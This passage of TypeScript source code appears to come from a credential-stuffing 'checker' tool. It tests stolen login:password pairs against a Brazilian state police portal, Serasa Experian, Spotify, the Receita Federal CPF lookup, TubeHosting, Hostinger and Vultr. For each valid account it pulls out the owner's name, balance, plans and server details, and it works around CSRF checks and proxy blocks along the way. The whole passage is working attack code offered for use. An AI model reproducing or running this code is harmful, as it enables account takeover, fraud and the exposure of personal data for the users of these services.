    try { await import("fs").then(fs => fs.promises.unlink(cookieFile)); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SIGMA CHECKER — https://sigma.policiacivil.ma.gov.br (Polícia Civil do Maranhão)
//  Strategy: POST username/password form to root URL.
//  HIT: "Painel de atividades" in response body.
//  FAIL: any other response.
// ═══════════════════════════════════════════════════════════════════════════════
const SIGMA_URL     = "https://sigma.policiacivil.ma.gov.br";
const SIGMA_TIMEOUT = 20_000;

async function checkSigma(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;

  try {
    const postData = `username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}`;

    const result = await runCurl([
      "-X", "POST",
      "-k", "-L", "--max-redirs", "8",
      "-H", "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "-H", `Origin: ${SIGMA_URL}`,
      "-H", `Referer: ${SIGMA_URL}/`,
      "-H", "Sec-Fetch-Site: same-origin",
      "-H", "Sec-Fetch-Mode: navigate",
      "--data-raw", postData,
      SIGMA_URL,
    ], SIGMA_TIMEOUT);

    const body = result.body;

    if (body.includes("Painel de atividades") || body.includes("painel") && body.includes("Sair")) {
      const info: string[] = [`usuario:${login}`];
      // Try to extract user name from the dashboard
      const nomeM = body.match(/Olá,?\s+([^<\n,]{3,40})/i) ?? body.match(/nome[^>]*>([^<]{3,40})/i);
      if (nomeM) info.push(`nome:${nomeM[1].trim()}`);
      return { credential, login, status: "HIT", detail: info.join(" | ") };
    }

    if (body.includes("Senha inválida") || body.includes("Usuário inválido") ||
        body.includes("Usuário ou senha") || body.includes("username") && body.includes("password"))
      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };

    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };

    return { credential, login, status: "FAIL", detail: `HTTP_${result.statusCode}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SERASA EXPERIENCE (ADMIN) CHECKER — https://menu.serasaexperian.com.br/login
//  Strategy: POST to IAM endpoint with Basic auth → extract token + query saldo
//  Returns: login confirmed + saldo/crédito disponível quando possível
// ═══════════════════════════════════════════════════════════════════════════════
const SERASA_EXP_LOGIN_URL  = "https://api.serasaexperian.com.br/security/iam/v1/user-identities/login";
const SERASA_EXP_CLIENT_ID  = "5de90e8a9d731e000a4f192d";
const SERASA_EXP_TIMEOUT    = 20_000;

async function checkSerasaExp(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const b64 = Buffer.from(`${login}:${password}`).toString("base64");

  try {
    const loginResult = await runCurl([
      "-X", "POST",
      "-H", `Authorization: Basic ${b64}`,
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "-H", `User-Agent: ${DESKTOP_UA}`,
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      `${SERASA_EXP_LOGIN_URL}?clientId=${SERASA_EXP_CLIENT_ID}`,
    ], SERASA_EXP_TIMEOUT);

    const body = loginResult.body;

    if (loginResult.statusCode === 200 || loginResult.statusCode === 201) {
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const token = (j.accessToken ?? j.access_token ?? j.token ?? "") as string;

        if (token) {
          const info: string[] = [`login:${login}`];

          // Decode JWT to extract user metadata
          try {
            const payload = JSON.parse(
              Buffer.from(token.split(".")[1], "base64url").toString("utf8"),
            ) as Record<string, unknown>;
            const name    = (payload.name ?? payload.preferred_username ?? "") as string;
            const empresa = (payload.company ?? payload.client ?? payload.clientName ?? "") as string;
            const saldo   = (payload.credit ?? payload.balance ?? payload.creditLimit ?? payload.saldo ?? "") as string | number;
            if (name)    info.push(`nome:${name.slice(0, 40)}`);
            if (empresa) info.push(`emp:${String(empresa).slice(0, 40)}`);
            if (saldo !== "") info.push(`saldo:R$${saldo}`);
          } catch { /**/ }

          // Try to fetch credit balance from a secondary endpoint
          try {
            const balanceResult = await runCurl([
              "-H", `Authorization: Bearer ${token}`,
              "-H", "Accept: application/json",
              "-H", `User-Agent: ${DESKTOP_UA}`,
              "https://api.serasaexperian.com.br/account/v1/billing/balance",
            ], 10_000);
            if (balanceResult.statusCode === 200) {
              const bj = JSON.parse(balanceResult.body) as Record<string, unknown>;
              const bal = bj.balance ?? bj.saldo ?? bj.creditBalance ?? bj.availableBalance ?? "";
              if (bal !== "") info.push(`saldo:R$${bal}`);
            }
          } catch { /**/ }

          return { credential, login, status: "HIT", detail: info.join(" | ") };
        }
      } catch { /**/ }
      return { credential, login, status: "HIT", detail: `login:${login} | serasa_exp_ok` };
    }

    if (loginResult.statusCode === 401 || loginResult.statusCode === 403) {
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const msg = String(j.message ?? j.error ?? j.errorDescription ?? "invalid_credentials").slice(0, 80);
        return { credential, login, status: "FAIL", detail: msg };
      } catch {
        return { credential, login, status: "FAIL", detail: "invalid_credentials" };
      }
    }

    if (loginResult.statusCode === 404)
      return { credential, login, status: "FAIL", detail: "user_not_found" };

    if (loginResult.statusCode === 0 || loginResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}` };

    return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}:${body.slice(0, 60)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SPOTIFY CHECKER — https://accounts.spotify.com/api/login
//  Flow: GET login page → extract csrf_token cookie → POST credentials → parse JSON
//  Returns: plan (free/premium), country, display name when available
// ═══════════════════════════════════════════════════════════════════════════════
const SPOTIFY_TIMEOUT = 25_000;

async function checkSpotify(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/sp_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  try {
    // Step 1: GET login page — extract CSRF token from cookie jar
    // NOTE: accounts.spotify.com is blocked by residential proxies, so we use a direct
    //       connection for the GET step. The POST step still uses residential proxy.
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "5",
        "-c", cookieFile, "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: en-US,en;q=0.9",
        "https://accounts.spotify.com/login",
      ], SPOTIFY_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
    }

    // Extract CSRF token and session SID from cookie jar (Netscape tab-separated format).
    // Spotify 2024+: "sp_sso_csrf_token" is the CSRF token sent in the POST body.
    // "__Host-sp_csrf_sid" is a new session-binding cookie required since late 2024.
    // curl may not automatically send __Host- prefixed cookies from the jar (host-strict
    // attribute) — so we extract and inject it explicitly via -b.
    let csrfToken = "";
    let spCsrfSid = "";
    try {
      const jar = readFileSync(cookieFile, "utf8");
      const mCsrf = jar.match(/(?:sp_sso_)?csrf_token\t(\S+)/);
      if (mCsrf) csrfToken = mCsrf[1];
      // Extract __Host-sp_csrf_sid — the tab-separated name is the last field before value
      const mSid = jar.match(/__Host-sp_csrf_sid\t(\S+)/);
      if (mSid) spCsrfSid = mSid[1];
    } catch { /**/ }

    if (!csrfToken) {
      // Try from HTML body (meta tag or inline JS — older Spotify)
      const m2 = getResult.body.match(/"csrf_token"\s*:\s*"([^"]+)"/);
      if (m2) csrfToken = m2[1];
    }

    if (!csrfToken) {
      return { credential, login, status: "ERROR", detail: "NO_CSRF_TOKEN" };
    }

    // Step 2: POST credentials to Spotify login API
    const postBody = [
      `username=${encodeURIComponent(login)}`,
      `password=${encodeURIComponent(password)}`,
      `remember=true`,
      `csrf_token=${encodeURIComponent(csrfToken)}`,
    ].join("&");

    // sp_key is a UUID set by Spotify's JavaScript to identify the browser session.
    // Inject a random one to satisfy the server-side session check.
    const spKey = randomUUID();

    // Build explicit cookie string — curl may skip __Host- cookies from the jar
    // due to strict host-attribute handling.  Inject them directly via -b header.
    const extraCookies = [`sp_key=${spKey}`, ...(spCsrfSid ? [`__Host-sp_csrf_sid=${spCsrfSid}`] : [])].join("; ");

    let postResult: CurlResult;
    try {
      // Direct connection — residential proxy blocks accounts.spotify.com CONNECT tunnel
      postResult = await runCurl([
        "--compressed", "-X", "POST",
        "-b", cookieFile, "-c", cookieFile,
        "-b", extraCookies,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Accept: application/json",
        "-H", "Origin: https://accounts.spotify.com",
        "-H", "Referer: https://accounts.spotify.com/en/login",
        "--data-raw", postBody,
        "https://accounts.spotify.com/api/login",
      ], SPOTIFY_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body.trim();

    // Spotify returns JSON: { "error": null } on success or { "error": "badAuth" } on fail
    try {
      const j = JSON.parse(body) as Record<string, unknown>;
      if (j.error === null || j.result === "ok" || j.logged_in === true) {
        // Step 3: get Bearer token via open.spotify.com (sp_dc cookie → accessToken)
        // api.spotify.com/v1/me only accepts Bearer tokens, not cookies from accounts.spotify.com
        const detail: string[] = [];
        try {
          const tokenRes = await runCurl([
            "--compressed",
            "-b", cookieFile,
            "-H", `User-Agent: ${DESKTOP_UA}`,
            "-H", "Accept: application/json",
            "-H", "Origin: https://open.spotify.com",
            "-H", "Referer: https://open.spotify.com/",
            "https://open.spotify.com/get_access_token?reason=transport&productType=web_player",
          ], 10_000);
          if (tokenRes.statusCode === 200) {
            const tokenJ = JSON.parse(tokenRes.body) as Record<string, unknown>;
            const accessToken = tokenJ.accessToken as string | undefined;
            if (accessToken) {
              // Step 4: fetch profile with Bearer token
              const profileRes = await runCurl([
                "--compressed",
                "-H", `Authorization: Bearer ${accessToken}`,
                "-H", `User-Agent: ${DESKTOP_UA}`,
                "-H", "Accept: application/json",
                "https://api.spotify.com/v1/me",
              ], 10_000);
              if (profileRes.statusCode === 200) {
                const p = JSON.parse(profileRes.body) as Record<string, unknown>;
                const name    = (p.display_name ?? p.id ?? "") as string;
                const country = (p.country ?? "") as string;
                const product = (p.product ?? "") as string; // "premium" | "free" | "open"
                if (name)    detail.push(`nome:${name.slice(0, 40)}`);
                if (product) detail.push(`plano:${product}`);
                if (country) detail.push(`país:${country}`);
              }
            }
          }
        } catch { /**/ }
        return { credential, login, status: "HIT", detail: detail.length ? detail.join(" | ") : "spotify_ok" };
      }
      if (j.error === "badAuth" || j.error === "badCredentials" || j.error === "invalidCredentials" ||
          j.error === "bad_credentials" || j.error === "AUTHENTICATION_FAILED") {
        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
      }
      if (j.error === "accountLocked" || j.error === "locked") {
        return { credential, login, status: "HIT", detail: "CONTA_BLOQUEADA — login válido" };
      }
      // server_error / unknown errors = session state issue (CSRF mismatch, missing sp_key, etc.)
      if (j.error === "server_error" || j.error === "unauthorized_client" ||
          j.error === "temporarily_unavailable") {
        return { credential, login, status: "ERROR", detail: `SP_SESSION_ERR:${String(j.error)}` };
      }
      if (j.error) {
        return { credential, login, status: "FAIL", detail: `error:${String(j.error).slice(0, 60)}` };
      }
    } catch { /**/ }

    // Fallback: check for redirect to logged-in page
    if (postResult.statusCode === 200 && body.includes("access_token")) {
      return { credential, login, status: "HIT", detail: "spotify_token_ok" };
    }
    if (postResult.statusCode === 401 || postResult.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
    }
    if (postResult.statusCode === 429) {
      return { credential, login, status: "ERROR", detail: "RATE_LIMITED:429" };
    }
    if (postResult.statusCode === 0 || postResult.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
    }
    return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 60)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  RECEITA FEDERAL CHECKER — Consulta CPF via portal Gov.br
//  Format: login = CPF (11 dígitos), password = data de nascimento (DD/MM/YYYY)
//  Returns: nome, situação cadastral (Regular/Suspensa/Cancelada/Pendente)
// ═══════════════════════════════════════════════════════════════════════════════
const RECEITA_TIMEOUT = 25_000;
const RECEITA_BASE = "https://solucoes.receita.fazenda.gov.br/Servicos/cpfinternetWeb";
const RECEITA_URL = `${RECEITA_BASE}/consultarSituacao/ConsultarPublico.asp`;

function formatCPF(cpf: string): string {
  const digits = cpf.replace(/\D/g, "");
  if (digits.length !== 11) return cpf;
  return `${digits.slice(0,3)}.${digits.slice(3,6)}.${digits.slice(6,9)}-${digits.slice(9)}`;
}

async function checkReceita(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cpf = login.replace(/\D/g, "");
  if (cpf.length !== 11) {
    return { credential, login, status: "FAIL", detail: "CPF_INVALIDO:deve_ter_11_digitos" };
  }

  // Accept date in formats: DDMMYYYY, DD/MM/YYYY, DD-MM-YYYY, YYYY-MM-DD
  let dataNascimento = password.replace(/\D/g, "");
  if (dataNascimento.length === 8) {
    // Could be DDMMYYYY or YYYYMMDD
    if (parseInt(dataNascimento.slice(0, 2), 10) > 31) {
      // Likely YYYYMMDD → convert to DD/MM/YYYY
      dataNascimento = `${dataNascimento.slice(6)}/${dataNascimento.slice(4,6)}/${dataNascimento.slice(0,4)}`;
    } else {
      dataNascimento = `${dataNascimento.slice(0,2)}/${dataNascimento.slice(2,4)}/${dataNascimento.slice(4)}`;
    }
  } else {
    return { credential, login, status: "FAIL", detail: "DATA_INVALIDA:use_DDMMYYYY" };
  }

  const receitaCookieFile = `/tmp/rf_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  try {
    // Step 1: GET the form page to obtain ASPSESSIONID cookie (required by the ASP.NET server)
    try {
      await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-c", receitaCookieFile, "-b", receitaCookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        `${RECEITA_BASE}/consultarSituacao/ConsultarPublico.asp`,
      ], 12_000);
    } catch { /* ignore — POST might still work */ }

    const postBody = [
      `txtCPF=${encodeURIComponent(formatCPF(cpf))}`,
      `txtDataNascimento=${encodeURIComponent(dataNascimento)}`,
      `Enviar=Consultar`,
    ].join("&");

    const result = await runCurl([
      "--compressed", "-X", "POST",
      "-c", receitaCookieFile, "-b", receitaCookieFile,
      "-H", `User-Agent: ${DESKTOP_UA}`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "-H", `Referer: ${RECEITA_BASE}/consultarSituacao/ConsultarPublico.asp`,
      "-H", "Origin: https://solucoes.receita.fazenda.gov.br",
      "-L", "--max-redirs", "3",
      "--data-raw", postBody,
      RECEITA_URL,
    ], RECEITA_TIMEOUT);

    const body = result.body;
    const bLow = body.toLowerCase();

    // Check for error/block
    if (result.statusCode === 0 || result.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }
    if (bLow.includes("data de nascimento") && bLow.includes("não confere")) {
      return { credential, login, status: "FAIL", detail: "data_nascimento_incorreta" };
    }
    if (bLow.includes("cpf inválido") || bLow.includes("cpf não encontrado") || bLow.includes("cpf inexistente")) {
      return { credential, login, status: "FAIL", detail: "cpf_invalido_ou_inexistente" };
    }
    if (bLow.includes("não foi possível") || bLow.includes("serviço indisponível") || bLow.includes("fora do ar")) {
      return { credential, login, status: "ERROR", detail: "SERVICO_INDISPONIVEL" };
    }

    // Extract situação cadastral
    const situacaoMatch = body.match(/Situa[çc][aã]o\s+Cadastral[^:]*:\s*<[^>]+>\s*([^<]{2,40})/i)
      ?? body.match(/SITUA[ÇC][AÃ]O\s*:?\s*<[^>]*>([^<]{2,40})/i)
      ?? body.match(/<td[^>]*>\s*(Regular|Suspensa|Cancelada|Pendente de Regulariza[çc][aã]o|N[uú]la)[^<]*<\/td>/i);

    const nomeMatch = body.match(/Nome[^:]*:\s*<[^>]+>\s*([^<]{2,80})/i)
      ?? body.match(/<td[^>]*class="[^"]*resultado[^"]*"[^>]*>\s*([A-ZÀ-Ú][A-ZÀ-Ú\s]{5,60})<\/td>/i);

    if (situacaoMatch || nomeMatch) {
      const info: string[] = [];
      if (nomeMatch)    info.push(`nome:${nomeMatch[1].trim().slice(0, 60)}`);
      if (situacaoMatch) {
        const sit = situacaoMatch[1].trim().slice(0, 40);
        info.push(`situação:${sit}`);
        if (sit.toLowerCase().includes("regular")) {
          return { credential, login, status: "HIT", detail: info.join(" | ") };
        }
        // Suspensa/Cancelada/Nula = valid CPF but irregular (still a HIT — data found)
        return { credential, login, status: "HIT", detail: info.join(" | ") };
      }
      return { credential, login, status: "HIT", detail: info.join(" | ") };
    }

    // Fallback: large body with typical response structure → data found
    if (body.length > 3000 && !bLow.includes("login") && !bLow.includes("senha")) {
      return { credential, login, status: "HIT", detail: "dados_encontrados" };
    }

    if (result.statusCode === 200 && body.length < 500) {
      return { credential, login, status: "ERROR", detail: "RESPOSTA_VAZIA" };
    }

    return { credential, login, status: "FAIL", detail: "cpf_ou_data_incorretos" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  } finally {
    try { unlinkSync(receitaCookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TUBEHOSTING CHECKER — WHMCS form auth (tubehosting.com.br)
//  Retorna: saldo de crédito, quantidade de serviços/VPS ativos
// ═══════════════════════════════════════════════════════════════════════════════
async function checkTubeHosting(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/tube_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  // ── helpers ────────────────────────────────────────────────────────────────
  function htmlStrip(s: string) { return s.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim(); }

  /** Extract first regex group from html, case-insensitive */
  function grab(html: string, re: RegExp): string | null {
    const m = html.match(re); return m ? htmlStrip(m[1] ?? "") : null;
  }

  /** Extract VPS spec lines from a WHMCS product-detail page */
  function parseVpsDetail(html: string): string {
    const specs: string[] = [];

    // CPU — "2 vCPU", "4 Cores", custom field "CPU: 4"
    const cpu = grab(html, /(\d+)\s*(?:v?cpu|cores?)/i)
      ?? grab(html, /cpu[:\s]+(\d+)/i);
    if (cpu) specs.push(`${cpu}vCPU`);

    // RAM — "4096 MB", "4 GB RAM"
    const ramRaw = grab(html, /(\d+)\s*(?:gb|mb)\s*(?:ram|memory|memória)/i)
      ?? grab(html, /ram[:\s]+(\d+\s*(?:gb|mb))/i);
    if (ramRaw) specs.push(`RAM:${ramRaw.replace(/\s/g, "")}`);

    // Disk — "50 GB SSD", "100 GB NVMe"
    const disk = grab(html, /(\d+)\s*(?:gb|tb)\s*(?:ssd|nvme|hdd|disco|storage|armazen)/i)
      ?? grab(html, /(?:ssd|nvme|disco)[:\s]+(\d+\s*(?:gb|tb))/i);
    if (disk) specs.push(`SSD:${disk.replace(/\s/g, "")}`);

    // Bandwidth
    const bw = grab(html, /(\d+\s*(?:gb|tb))\s*(?:bandwidth|transfer|tráfego)/i);
    if (bw) specs.push(`BW:${bw.replace(/\s/g, "")}`);

    // Status
    const st = grab(html, /(?:status|situação)[:\s]*<[^>]+>\s*([\w\s]+)/i)
      ?? grab(html, /class="[^"]*badge[^"]*"[^>]*>\s*([\w\s]+)/i);
    if (st && st.length < 20) specs.push(`status:${st.toLowerCase()}`);

    // Next due date / vencimento
    const due = grab(html, /(?:próximo vencimento|next due date|renewal date|vencimento)[:\s]*([0-9]{1,2}[\/\-][0-9]{1,2}[\/\-][0-9]{2,4})/i)
      ?? grab(html, /due[:\s]+([0-9]{1,2}[\/\-][0-9]{1,2}[\/\-][0-9]{2,4})/i);
    if (due) specs.push(`vence:${due}`);

    // Plan name from <h1> or product name
    const plan = grab(html, /<h[12][^>]*>\s*([^<]{3,60})\s*<\/h[12]>/i);
    if (plan && !/clientarea|painel|área/i.test(plan)) specs.unshift(`plano:${plan}`);

    return specs.join(" | ");
  }

  try {
    // ── Step 1: GET login page for CSRF ───────────────────────────────────────
    const getResult = await runCurl([
      "--compressed", "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-A", DESKTOP_UA,
      "https://tubehosting.com.br/index.php?rp=/login",
    ], 20_000);

    const csrfMatch = getResult.body.match(/name="token"\s+value="([^"]+)"/i)
      ?? getResult.body.match(/<input[^>]+name="_token"[^>]+value="([^"]+)"/i);
    const csrf = csrfMatch ? csrfMatch[1] : "";

    // ── Step 2: POST credentials ───────────────────────────────────────────────
    const postResult = await runCurl([
      "--compressed", "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-A", DESKTOP_UA,
      "-X", "POST",
      "--data-urlencode", `username=${login}`,
      "--data-urlencode", `password=${password}`,
      ...(csrf ? ["--data-urlencode", `token=${csrf}`] : []),
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Referer: https://tubehosting.com.br/index.php?rp=/login",
      "https://tubehosting.com.br/index.php?rp=/login",
    ], 20_000);

    const body = postResult.body;
    const bLow = body.toLowerCase();

    const isLoggedIn =
      bLow.includes("clientarea") ||
      bLow.includes("meu painel") ||
      bLow.includes("área do cliente") ||
      bLow.includes("saldo") ||
      bLow.includes("crédito") ||
      (bLow.includes("bem-vindo") && !bLow.includes("login")) ||
      postResult.statusCode === 302;

    if (!isLoggedIn) {
      if (bLow.includes("senha incorreta") || bLow.includes("invalid") || bLow.includes("incorretos") || bLow.includes("não encontrado")) {
        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
      }
      if (postResult.statusCode === 0 || postResult.statusCode >= 500) {
        return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
      }
      return { credential, login, status: "FAIL", detail: "login_failed" };
    }

    // ── Step 3: fetch services list ────────────────────────────────────────────
    const header: string[] = [];
    const balMatch = body.match(/R\$\s*([\d.,]+)/);
    if (balMatch) header.push(`saldo:R$${balMatch[1]}`);

    const svcRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "3",
      "-c", cookieFile, "-b", cookieFile,
      "-A", DESKTOP_UA,
      "https://tubehosting.com.br/clientarea.php?action=services",
    ], 20_000);

    const svcHtml = svcRes.body;

    // Collect service detail IDs from href="clientarea.php?action=productdetails&id=N"
    const idRe  = /clientarea\.php\?action=productdetails&(?:amp;)?id=(\d+)/gi;
    const ids   = new Set<string>();
    let m2: RegExpExecArray | null;
    while ((m2 = idRe.exec(svcHtml)) !== null) ids.add(m2[1]);
    header.push(`serviços:${ids.size}`);

    // ── Step 4: fetch detail for each service (max 5) ─────────────────────────
    const machines: string[] = [];
    for (const id of [...ids].slice(0, 5)) {
      const detRes = await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-c", cookieFile, "-b", cookieFile,
        "-A", DESKTOP_UA,
        `https://tubehosting.com.br/clientarea.php?action=productdetails&id=${id}`,
      ], 20_000);
      const specs = parseVpsDetail(detRes.body);
      if (specs) machines.push(`[VPS#${id}] ${specs}`);
    }

    const detail = [...header, ...machines].join(" || ") || "tubehosting_ok";
    return { credential, login, status: "HIT", detail };

  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  HOSTINGER CHECKER — REST API login → hPanel
//  Retorna: nome, email, crédito, planos ativos (nome, ciclo, vencimento)
// ═══════════════════════════════════════════════════════════════════════════════
async function checkHostinger(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    // ── Step 1: Login ─────────────────────────────────────────────────────────
    const loginRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "3",
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "-H", `User-Agent: ${DESKTOP_UA}`,
      "--data-raw", JSON.stringify({ email: login, password }),
      "https://www.hostinger.com/api/v1/auth/login-v2",
    ], 20_000);

    if (loginRes.statusCode === 401 || loginRes.statusCode === 422) {
      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
    }
    if (loginRes.statusCode === 403 || loginRes.statusCode === 405 || loginRes.statusCode === 530) {
      return { credential, login, status: "ERROR", detail: `DATACENTER_BLOCKED:HTTP_${loginRes.statusCode}` };
    }
    if (loginRes.statusCode === 429) {
      return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
    }
    if (loginRes.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${loginRes.statusCode}` };
    }
    if (!loginRes.body.trim().startsWith("{")) {
      return { credential, login, status: "ERROR", detail: "DATACENTER_BLOCKED:non_json" };
    }

    const j    = JSON.parse(loginRes.body) as Record<string, unknown>;
    const data = (j.data ?? j) as Record<string, unknown>;
    const parts: string[] = [];

    if (data.name)  parts.push(`nome:${data.name}`);
    if (data.email) parts.push(`email:${data.email}`);
    const ba = data.billing_account as Record<string, unknown> | undefined;
    if (ba?.credit_balance !== undefined) parts.push(`crédito:${ba.credit_balance}${ba.currency ?? ""}`);

    // ── Step 2: grab JWT token to call subscriptions API ──────────────────────
    const token = (data.token as string) ?? (data.access_token as string) ?? "";

    if (token) {
      const subRes = await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-H", `Authorization: Bearer ${token}`,
        "-H", "Accept: application/json",
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "https://www.hostinger.com/api/v1/orders",
      ], 15_000);

      if (subRes.statusCode === 200) {
        try {
          const oj    = JSON.parse(subRes.body) as Record<string, unknown>;
          const items = (Array.isArray(oj.data) ? oj.data : Array.isArray(oj) ? oj : []) as Record<string, unknown>[];
          if (items.length) parts.push(`planos:${items.length}`);
          for (const item of items.slice(0, 4)) {
            const pname  = item.product_name ?? item.name ?? item.plan ?? "";
            const status = item.status ?? "";
            const due    = item.next_billing_date ?? item.expires_at ?? item.expiry_date ?? "";
            const cycle  = item.billing_period ?? item.period ?? "";
            const line: string[] = [];
            if (pname)  line.push(String(pname));
            if (cycle)  line.push(String(cycle));
            if (status) line.push(String(status));
            if (due)    line.push(`vence:${String(due).split("T")[0]}`);
            if (line.length) parts.push(`[${line.join(" | ")}]`);
          }
        } catch { /**/ }
      }
    }

    const detail = parts.length ? parts.join(" || ") : "hostinger_ok";
    return { credential, login, status: "HIT", detail };

  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  VULTR CHECKER — API key (password = API key)
//  Retorna: email, saldo, pendente, e por VPS: label, vCPU, RAM, disco, região, status
// ═══════════════════════════════════════════════════════════════════════════════
async function checkVultr(login: string, password: string): Promise<CheckResult> {
  const apiKey     = password.trim() || login.trim();
  const credential = `${login}:${password}`;
  try {
    // ── Account info ──────────────────────────────────────────────────────────
    const acctRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiKey}`,
      "-H", "Accept: application/json",
      "https://api.vultr.com/v2/account",
    ], 15_000);

    if (acctRes.statusCode === 401 || acctRes.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: "api_key_invalida" };
    }
    if (acctRes.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${acctRes.statusCode}` };
    }

    const aj   = JSON.parse(acctRes.body) as Record<string, unknown>;
    const acct = (aj.account ?? aj) as Record<string, unknown>;
    const parts: string[] = [];
    if (acct.email)                         parts.push(`email:${acct.email}`);
    if (acct.name)                          parts.push(`nome:${acct.name}`);
    if (acct.balance !== undefined)         parts.push(`saldo:$${acct.balance}`);
    if (acct.pending_charges !== undefined) parts.push(`pendente:$${acct.pending_charges}`);

    // ── Instances list ────────────────────────────────────────────────────────
    const instRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiKey}`,
      "-H", "Accept: application/json",
      "https://api.vultr.com/v2/instances?per_page=20",
    ], 12_000);

    if (instRes.statusCode === 200) {
      const ij        = JSON.parse(instRes.body) as Record<string, unknown>;
      const instances = (ij.instances as Record<string, unknown>[]) ?? [];
      const meta      = ij.meta as Record<string, unknown> | undefined;
      const total     = (meta?.total as number) ?? instances.length;
      parts.push(`vps:${total}`);

      for (const inst of instances.slice(0, 5)) {
        const label  = inst.label ?? inst.hostname ?? inst.id ?? "?";
        const vcpu   = inst.vcpu_count ?? inst.cpus ?? "?";
        const ram    = inst.ram !== undefined ? `${Math.round(Number(inst.ram) / 1024)}GB` : "?";
        const disk   = inst.disk !== undefined ? `${inst.disk}GB` : "?";
        const region = inst.region ?? "?";
        const status = inst.power_status ?? inst.status ?? "?";
        const plan   = inst.plan ?? "";
